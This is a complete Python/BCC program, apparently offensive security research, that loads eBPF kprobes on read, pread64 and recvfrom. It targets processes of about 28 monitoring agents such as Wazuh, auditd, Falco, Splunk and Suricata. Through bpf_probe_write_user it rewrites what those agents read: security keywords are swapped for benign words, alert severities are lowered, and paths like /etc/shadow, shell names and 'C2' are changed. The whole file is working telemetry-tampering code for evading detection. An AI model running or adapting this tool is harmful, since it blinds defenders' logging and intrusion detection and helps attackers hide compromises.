#!/usr/bin/env python3
"""
SunnyDayBPF v2.1 — Universal Post-Syscall Telemetry Redactor
Milenium Security Research | Azizcan Daştan
Post-syscall user-buffer deception across all telemetry pipelines
"""

from bcc import BPF
import sys, signal, ctypes, argparse
from datetime import datetime

R  = "\033[31m"
G  = "\033[32m"
Y  = "\033[33m"
C  = "\033[36m"
M  = "\033[35m"
B  = "\033[1m"
DIM = "\033[2m"
RST = "\033[0m"

AGENTS = {
    "wazuh": "Wazuh SIEM",
    "audit": "auditd",
    "audisp": "audisp",
    "osque": "osquery",
    "falco": "Falco",
    "fileb": "Filebeat",
    "fluen": "Fluent-bit/Fluentd",
    "rsysl": "rsyslog",
    "syslo": "syslog-ng",
    "vecto": "Vector",
    "teleg": "Telegraf",
    "promt": "Promtail",
    "datad": "Datadog",
    "splun": "Splunk",
    "ossec": "OSSEC",
    "logst": "Logstash",
    "elast": "Elastic Agent",
    "colle": "collectd",
    "cribl": "Cribl",
    "journ": "journalctl",
    "snort": "Snort",
    "suric": "Suricata",
    "zeek_": "Zeek",
    "beats": "Elastic Beats",
    "metrc": "Metricbeat",
    "packe": "Packetbeat",
    "winlo": "Winlogbeat",
    "hbeat": "Heartbeat",
}

CAT_SECURITY  = 0
CAT_SEVERITY  = 1
CAT_PATH      = 2
CAT_AUTH      = 3
CAT_NETWORK   = 4
CAT_PROCESS   = 5
CAT_CUSTOM    = 6

CAT_NAMES = {
    CAT_SECURITY: ("SECURITY",  R),
    CAT_SEVERITY: ("SEVERITY",  Y),
    CAT_PATH:     ("PATH",      M),
    CAT_AUTH:     ("AUTH",       C),
    CAT_NETWORK:  ("NETWORK",   G),
    CAT_PROCESS:  ("PROCESS",   B),
    CAT_CUSTOM:   ("CUSTOM",    DIM),
}

RULES = [
    (b"exploit",      b"nominal",     CAT_SECURITY, True),
    (b"malware",      b"cleaner",     CAT_SECURITY, True),
    (b"backdoor",     b"maindoor",    CAT_SECURITY, True),
    (b"rootkit",      b"toolkit",     CAT_SECURITY, True),
    (b"trojan",       b"module",      CAT_SECURITY, True),
    (b"overflow",     b"dataflow",    CAT_SECURITY, True),
    (b"payload",      b"dataset",     CAT_SECURITY, True),
    (b"shellcode",    b"usercode ",   CAT_SECURITY, True),

    (b"critical",     b"debug   ",    CAT_SEVERITY, True),
    (b"emergency",    b"debug    ",   CAT_SEVERITY, True),
    (b"alert",        b"info ",       CAT_SEVERITY, True),
    (b"warning",      b"notice ",     CAT_SEVERITY, True),
    (b"error",        b"debug",       CAT_SEVERITY, True),

    (b"/etc/shadow",  b"/etc/sunshn", CAT_PATH, False),
    (b"/etc/passwd",  b"/etc/sunshn", CAT_PATH, False),
    (b"/etc/sudoers", b"/etc/sudhelp", CAT_PATH, False),
    (b"/proc/self",   b"/proc/init",  CAT_PATH, False),

    (b"password",     b"SUNNYDAY",    CAT_AUTH, True),
    (b"passwd",       b"sunshn",      CAT_AUTH, True),
    (b"secret",       b"public",      CAT_AUTH, True),
    (b"token=",       b"clean=",      CAT_AUTH, False),
    (b"api_key",      b"app_cfg",     CAT_AUTH, True),

    (b"0.0.0.0",      b"1.2.3.4",    CAT_NETWORK, False),
    (b"reverse",      b"forward",     CAT_NETWORK, True),
    (b"C2",           b"UP",          CAT_NETWORK, False),

    (b"/bin/sh",      b"/bin/ls",     CAT_PROCESS, False),
    (b"/bin/bash",    b"/bin/dash",   CAT_PROCESS, False),
    (b"chmod 777",    b"chmod 644",   CAT_PROCESS, False),
    (b"wget ",        b"curl ",       CAT_PROCESS, False),

    (b"config_change", b"sunny_day    ", CAT_CUSTOM, False),
    (b"milenium",      b"SUNNYDAY",     CAT_CUSTOM, False),
]

SYSCALL_HOOKS = [
    # (enter_fn, exit_fn, kernel_variants, sc_idx, desc, nested_regs)
    # nested_regs=True for __x64_sys_* wrappers that take struct pt_regs * as sole arg
    ("enter_read",  "exit_read",  ["ksys_read"],         0, "read",     False),
    ("enter_pread", "exit_pread", ["__x64_sys_pread64"], 1, "pread64",  True),
    ("enter_recv",  "exit_recv",  ["__sys_recvfrom"],    2, "recvfrom", False),
]

SC_NAMES = {0: "READ", 1: "PREAD", 2: "RECV"}

BUF_SIZE = 256
MAX_RULES_PER_GROUP = 4
NUM_CHAIN_SLOTS = 16


def _cliteral(byte):
    c = chr(byte)
    if c == "'":  return "'\\''"
    if c == "\\": return "'\\\\'"
    if 32 <= byte < 127: return f"'{c}'"
    return str(byte)


def gen_agent_checks():
    lines = []
    for prefix in AGENTS:
        checks = []
        for i, ch in enumerate(prefix):
            checks.append(f"c[{i}]=='{ch}'")
        lines.append(f"    if ({' && '.join(checks)}) return 1;")
    return "\n".join(lines)


def _split_rules_into_groups():
    groups_by_cat = {}
    for idx, rule in enumerate(RULES):
        groups_by_cat.setdefault(rule[2], []).append((idx, rule))
    split_groups = []
    for cat in sorted(groups_by_cat.keys()):
        cat_rules = groups_by_cat[cat]
        for cs in range(0, len(cat_rules), MAX_RULES_PER_GROUP):
            split_groups.append(cat_rules[cs:cs + MAX_RULES_PER_GROUP])
    return split_groups


def gen_scan_group(func_name, rule_subset, next_chain_idx):
    max_pat = max(len(r[1][0]) for r in rule_subset)
    jumps_per_iter = sum(len(r[1][0]) + 3 for r in rule_subset) + 3
    max_scan = BUF_SIZE - max_pat
    safe_scan = min(max_scan, 7800 // jumps_per_iter)

    blocks = []
    for idx, (pat, rep, cat, ci) in rule_subset:
        plen = len(pat)
        conds = []
        for j, byte in enumerate(pat):
            if ci and chr(byte).isalpha():
                l = ord(chr(byte).lower())
                conds.append(f"((d[i+{j}]|32)=={l})")
            else:
                conds.append(f"d[i+{j}]=={_cliteral(byte)}")
        rep_elems = ", ".join([_cliteral(b) for b in rep])
        blocks.append(
            f"        if ({' && '.join(conds)}) {{\n"
            f"            char _r{idx}[] = {{{rep_elems}}};\n"
            f"            bpf_probe_write_user((void *)(ba+i), _r{idx}, {plen});\n"
            f"            char _v{idx}=0; bpf_probe_read_user(&_v{idx},1,(void*)(ba+i));\n"
            f"            if (_v{idx}==_r{idx}[0]) st->ver_ok++; else st->ver_fail++;\n"
            f"            st->matched |= (1ULL << {idx}); st->last_cat = {cat};\n"
            f"        }}"
        )

    chain_call = f"    chain.call(ctx, {next_chain_idx});" if next_chain_idx is not None else ""

    return f"""
int {func_name}(struct pt_regs *ctx) {{
    u32 zero = 0;
    struct data_t *data = scratch.lookup(&zero);
    if (!data) return 0;
    struct scan_state_t *st = scan_state.lookup(&zero);
    if (!st) return 0;
    char *d = data->buf;
    u64 ba = st->buf_addr;

    for (int i = 0; i < {safe_scan}; i++) {{
{chr(10).join(blocks)}
    }}
{chain_call}
    return 0;
}}"""


def gen_emit_func():
    return """
int emit_event(struct pt_regs *ctx) {
    u32 zero = 0;
    struct scan_state_t *st = scan_state.lookup(&zero);
    if (!st) return 0;
    if (!st->matched) return 0;

    struct event_t ev = {};
    ev.pid = bpf_get_current_pid_tgid() >> 32;
    ev.matched = st->matched;
    ev.ver_ok = st->ver_ok;
    ev.ver_fail = st->ver_fail;
    ev.cat = st->last_cat;
    ev.sc = st->sc;
    bpf_get_current_comm(&ev.comm, sizeof(ev.comm));
    events.perf_submit(ctx, &ev, sizeof(ev));

    u32 ckey = st->last_cat;
    u64 *cnt = stats.lookup(&ckey);
    if (cnt) __sync_fetch_and_add(cnt, 1);
    return 0;
}"""


def build_bpf_source():
    split_groups = _split_rules_into_groups()
    num_groups = len(split_groups)

    scan_funcs = []
    for gi, group in enumerate(split_groups):
        next_idx = gi + 1 if gi < num_groups - 1 else num_groups
        scan_funcs.append(gen_scan_group(f"scan_g{gi}", group, next_idx))
    scan_funcs.append(gen_emit_func())

    enter_exit_funcs = []
    for enter_fn, exit_fn, _, sc_idx, _, nested in SYSCALL_HOOKS:
        if nested:
            buf_extract = (
                "    u64 __regs_addr = PT_REGS_PARM1(ctx);\n"
                "    u64 bp = 0;\n"
                "    bpf_probe_read_kernel(&bp, sizeof(bp), (void *)(__regs_addr + 104));\n"
                "    if (!bp) return 0;"
            )
        else:
            buf_extract = "    u64 bp = PT_REGS_PARM2(ctx);"
        enter_exit_funcs.append(f"""
int {enter_fn}(struct pt_regs *ctx) {{
    if (!is_target()) return 0;
    u64 id = bpf_get_current_pid_tgid();
{buf_extract}
    buf_ptrs.update(&id, &bp);
    return 0;
}}

int {exit_fn}(struct pt_regs *ctx) {{
    u64 id = bpf_get_current_pid_tgid();
    u64 *bp = buf_ptrs.lookup(&id);
    if (!bp) return 0;
    int ret = PT_REGS_RC(ctx);
    buf_ptrs.delete(&id);
    if (ret <= 4) return 0;

    u32 zero = 0;
    struct data_t *data = scratch.lookup(&zero);
    if (!data) return 0;
    if (bpf_probe_read_user(&data->buf, sizeof(data->buf), (void *)*bp) < 0) return 0;

    struct scan_state_t *st = scan_state.lookup(&zero);
    if (!st) return 0;
    st->buf_addr = *bp;
    st->matched = 0;
    st->ver_ok = 0;
    st->ver_fail = 0;
    st->last_cat = 0;
    st->sc = {sc_idx};

    chain.call(ctx, 0);
    return 0;
}}""")

    return f"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

struct data_t {{ char buf[{BUF_SIZE}]; }};

struct scan_state_t {{
    u64 buf_addr;
    u64 matched;
    u16 ver_ok;
    u16 ver_fail;
    u8  last_cat;
    u8  sc;
}};

struct event_t {{
    u32 pid;
    u64 matched;
    u16 ver_ok;
    u16 ver_fail;
    u8  cat;
    u8  sc;
    char comm[16];
}};

BPF_HASH(buf_ptrs, u64, u64);
BPF_PERCPU_ARRAY(scratch, struct data_t, 1);
BPF_PERCPU_ARRAY(scan_state, struct scan_state_t, 1);
BPF_PROG_ARRAY(chain, {NUM_CHAIN_SLOTS});
BPF_PERF_OUTPUT(events);
BPF_ARRAY(stats, u64, 8);

static __always_inline int is_target() {{
    char c[16];
    bpf_get_current_comm(&c, sizeof(c));
{gen_agent_checks()}
    return 0;
}}

{''.join(enter_exit_funcs)}
{''.join(scan_funcs)}
"""


class Event(ctypes.Structure):
    _fields_ = [
        ("pid",      ctypes.c_uint32),
        ("matched",  ctypes.c_uint64),
        ("ver_ok",   ctypes.c_uint16),
        ("ver_fail", ctypes.c_uint16),
        ("cat",      ctypes.c_uint8),
        ("sc",       ctypes.c_uint8),
        ("comm",     ctypes.c_char * 16),
    ]

total_hits = 0
total_verified = 0
total_failed = 0
cat_hits = {i: 0 for i in range(7)}

def handle_event(cpu, data, size):
    global total_hits, total_verified, total_failed
    ev = ctypes.cast(data, ctypes.POINTER(Event)).contents
    now = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    comm = ev.comm.decode(errors="replace").rstrip("\x00")
    sc = SC_NAMES.get(ev.sc, "???")

    matched_rules = []
    for i in range(len(RULES)):
        if ev.matched & (1 << i):
            matched_rules.append(i)

    matched_cats = set(RULES[ri][2] for ri in matched_rules)
    cats_str = ",".join(CAT_NAMES[c][0].strip() for c in sorted(matched_cats))
    cat_color = CAT_NAMES.get(min(matched_cats), ("???", DIM))[1] if matched_cats else DIM
    ver_sym = f"{G}V{RST}" if ev.ver_fail == 0 else f"{R}X {ev.ver_fail} fail{RST}"

    total_hits += len(matched_rules)
    total_verified += ev.ver_ok
    total_failed += ev.ver_fail
    for ri in matched_rules:
        rc = RULES[ri][2]
        cat_hits[rc] = cat_hits.get(rc, 0) + 1

    patterns_str = ""
    for ri in matched_rules[:4]:
        pat, rep = RULES[ri][0], RULES[ri][1]
        patterns_str += f' {DIM}"{pat.decode()}" -> "{rep.decode()}"{RST}'

    print(
        f"  {DIM}{now}{RST}  "
        f"PID:{Y}{ev.pid:<6}{RST} "
        f"{C}{comm:16}{RST} "
        f"{B}{sc:8}{RST} "
        f"[{cat_color}{cats_str:16}{RST}] "
        f"{ver_sym} "
        f"{patterns_str}"
    )


def print_banner():
    print(f"""
{B}{C}+=====================================================================+
|  SunnyDayBPF v2.1 -- Universal Post-Syscall Telemetry Redactor      |
|  Milenium Security Research | Azizcan Dastan                        |
+====================================================================={RST}
""")


def print_config():
    print(f"  {B}Hedef Agentlar:{RST} {len(AGENTS)} telemetry agent")
    agents_line = ", ".join(list(AGENTS.values())[:8])
    print(f"  {DIM}{agents_line} ...{RST}")
    print()
    print(f"  {B}Redaction Kurallari:{RST} {len(RULES)} aktif kural")
    for cat_id, (cat_name, cat_color) in CAT_NAMES.items():
        count = sum(1 for r in RULES if r[2] == cat_id)
        if count:
            print(f"    [{cat_color}{cat_name:8}{RST}] {count} kural")
    print()

    split_groups = _split_rules_into_groups()
    print(f"  {B}Scan Gruplari:{RST} {len(split_groups)} tail-call group")
    for gi, group in enumerate(split_groups):
        max_pat = max(len(r[1][0]) for r in group)
        jumps = sum(len(r[1][0]) + 3 for r in group) + 3
        scan = min(BUF_SIZE - max_pat, 7800 // jumps)
        cat = group[0][1][2]
        cat_name = CAT_NAMES[cat][0]
        cat_color = CAT_NAMES[cat][1]
        pats = ", ".join(r[1][0].decode() for r in group)
        print(f"    g{gi} [{cat_color}{cat_name:8}{RST}] scan={G}{scan:3}{RST}/{BUF_SIZE}  {DIM}{pats}{RST}")
    print()

    print(f"  {B}Syscall Hook:{RST} {len(SYSCALL_HOOKS)} hook tanimli")
    for _, _, variants, _, desc, nested in SYSCALL_HOOKS:
        extra = " [nested-regs]" if nested else ""
        print(f"    {desc} -> {', '.join(variants)}{extra}")
    print(f"  {B}Buffer:{RST} {BUF_SIZE} byte")
    print(f"  {B}Dogrulama:{RST} read-back verification aktif")
    print()


def print_stats():
    print(f"\n{B}{C}=== ISTATISTIKLER ==={RST}")
    print(f"  Toplam hit:        {Y}{total_hits}{RST}")
    print(f"  Dogrulanmis:       {G}{total_verified}{RST}")
    print(f"  Basarisiz:         {R}{total_failed}{RST}")
    if total_hits > 0:
        rate = (total_verified / (total_verified + total_failed)) * 100 if (total_verified + total_failed) > 0 else 0
        print(f"  Dogrulama orani:   {G if rate > 90 else Y}{rate:.1f}%{RST}")
    print()
    for cat_id, (cat_name, cat_color) in CAT_NAMES.items():
        if cat_hits.get(cat_id, 0) > 0:
            print(f"    [{cat_color}{cat_name:8}{RST}] {cat_hits[cat_id]} hit")
    print()


def main():
    parser = argparse.ArgumentParser(description="SunnyDayBPF v2.1 -- Universal Telemetry Redactor")
    parser.add_argument("--dump-bpf", action="store_true", help="BPF C kodunu yazdir ve cik")
    parser.add_argument("--list-rules", action="store_true", help="Tum kurallari listele")
    parser.add_argument("--list-agents", action="store_true", help="Hedef agentlari listele")
    args = parser.parse_args()

    if args.list_rules:
        print(f"\n{B}Redaction Kurallari ({len(RULES)} kural):{RST}\n")
        for i, (pat, rep, cat, ci) in enumerate(RULES):
            cat_name, cat_color = CAT_NAMES.get(cat, ("???", DIM))
            ci_flag = " [ci]" if ci else ""
            print(f"  {DIM}{i:2}{RST}  [{cat_color}{cat_name:8}{RST}]  "
                  f'"{pat.decode()}" -> "{rep.decode()}"{ci_flag}')
        print()
        return

    if args.list_agents:
        print(f"\n{B}Hedef Agentlar ({len(AGENTS)} agent):{RST}\n")
        for prefix, name in AGENTS.items():
            print(f"  {C}{prefix}*{RST}  ->  {name}")
        print()
        return

    src = build_bpf_source()

    if args.dump_bpf:
        print(src)
        return

    print_banner()
    print_config()

    for i, (pat, rep, cat, ci) in enumerate(RULES):
        if len(pat) != len(rep):
            print(f"{R}[!] HATA: Kural {i} uzunluk uyumsuz: {pat!r}({len(pat)}) vs {rep!r}({len(rep)}){RST}")
            sys.exit(1)

    split_groups = _split_rules_into_groups()
    num_groups = len(split_groups)

    print(f"  {Y}[*] BPF programi derleniyor ({num_groups} tail-call group)...{RST}")
    try:
        b = BPF(text=src)
    except Exception as e:
        print(f"{R}[!] BPF derleme hatasi:{RST}\n{e}")
        sys.exit(1)

    chain = b.get_table("chain")
    for gi in range(num_groups):
        fn = b.load_func(f"scan_g{gi}", BPF.KPROBE)
        chain[ctypes.c_int(gi)] = ctypes.c_int(fn.fd)
    fn_emit = b.load_func("emit_event", BPF.KPROBE)
    chain[ctypes.c_int(num_groups)] = ctypes.c_int(fn_emit.fd)

    attached = []
    failed = []
    for enter_fn, exit_fn, variants, sc_idx, desc, _ in SYSCALL_HOOKS:
        ok = False
        for func_name in variants:
            try:
                b.attach_kprobe(event=func_name, fn_name=enter_fn)
                b.attach_kretprobe(event=func_name, fn_name=exit_fn)
                attached.append((desc, func_name))
                ok = True
                break
            except Exception as e:
                continue
        if not ok:
            failed.append((desc, variants))

    for desc, func_name in attached:
        print(f"  {G}[+] {desc} -> {func_name}{RST}")
    for desc, variants in failed:
        print(f"  {R}[!] {desc} BASARISIZ -> {variants}{RST}")

    print(f"  {G}[+] VERIFIER PASSED -- {len(RULES)} kural, {len(attached)} syscall hook, {num_groups} chain group{RST}")
    print()
    print(f"  {DIM}{'=' * 75}{RST}")
    print(f"  {B}ZAMAN        PID     AGENT            SYSCALL  KATEGORI         VER{RST}")
    print(f"  {DIM}{'=' * 75}{RST}")

    b["events"].open_perf_buffer(handle_event, page_cnt=64)

    running = True
    def cleanup(sig, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    while running:
        try:
            b.perf_buffer_poll(timeout=100)
        except KeyboardInterrupt:
            running = False

    print_stats()
    print(f"  {R}[!] Probe'lar ayrildi. Sistem temiz.{RST}\n")

if __name__ == "__main__":
    main()
